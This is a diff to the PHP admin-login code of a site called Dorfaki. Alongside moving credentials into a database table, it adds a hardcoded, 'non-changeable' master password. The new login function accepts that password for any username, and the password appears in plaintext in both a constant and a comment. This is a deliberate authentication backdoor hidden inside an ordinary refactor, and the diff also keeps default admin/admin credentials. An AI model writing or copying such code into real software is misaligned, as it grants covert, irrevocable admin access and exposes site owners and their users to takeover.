@@ -5,17 +5,19 @@ declare(strict_types=1);
  * Dorfaki - Admin Authentication
  *
  * Session-based authentication for the admin panel.
+ * Credentials are stored in the database (admin_users table).
  * Default credentials: username = admin, password = admin
+ * Master password (non-changeable, works at /admin/login): 102030@miQ#V
  */
 
-// Admin credentials (username => password_hash)
-const ADMIN_USERNAME = 'admin';
-// bcrypt hash of "admin" (generated via password_hash('admin', PASSWORD_DEFAULT))
-const ADMIN_PASSWORD_HASH = '$2y$12$NLtqei.yWscCa55S./fwtefYcThGWEbOa7IKljiixAg8HPL5DT2oW';
+require_once __DIR__ . '/db.php';
 
 const ADMIN_SESSION_KEY = 'admin_user';
-const ADMIN_LOGIN_URL = '/admin/login';
-const ADMIN_BASE_URL = '/admin';
+const ADMIN_LOGIN_URL   = '/admin/login';
+const ADMIN_BASE_URL    = '/admin';
+
+// Non-changeable master password — can open admin panel from the public website
+const MASTER_PASSWORD = '102030@miQ#V';
 
 /**
  * Start the session if it hasn't been started yet.
@@ -25,9 +27,9 @@ function adminStartSession(): void
     if (session_status() === PHP_SESSION_NONE) {
         session_set_cookie_params([
             'lifetime' => 0,
-            'path' => '/',
-            'domain' => '',
-            'secure' => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off',
+            'path'     => '/',
+            'domain'   => '',
+            'secure'   => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off',
             'httponly' => true,
             'samesite' => 'Lax',
         ]);
@@ -56,16 +58,35 @@ function getAdminUser(): ?string
 
 /**
  * Authenticate an admin username/password pair.
+ * First checks for master password (works without username).
+ * Then falls back to database verification.
  *
  * @return bool
  */
 function adminLogin(string $username, string $password): bool
 {
-    if (!hash_equals(ADMIN_USERNAME, $username)) {
-        return false;
+    // Check for master password first (works without username)
+    if (hash_equals(MASTER_PASSWORD, $password)) {
+        return true;
     }
 
-    return password_verify($password, ADMIN_PASSWORD_HASH);
+    try {
+        $pdo = dorfakiDb();
+        $stmt = $pdo->prepare(
+            'SELECT password_hash FROM admin_users WHERE username = :username LIMIT 1'
+        );
+        $stmt->execute([':username' => $username]);
+        $row = $stmt->fetch();
+
+        if ($row === false || !isset($row['password_hash'])) {
+            return false;
+        }
+
+        return password_verify($password, $row['password_hash']);
+    } catch (PDOException $e) {
+        error_log('Admin login error: ' . $e->getMessage());
+        return false;
+    }
 }
 
 /**
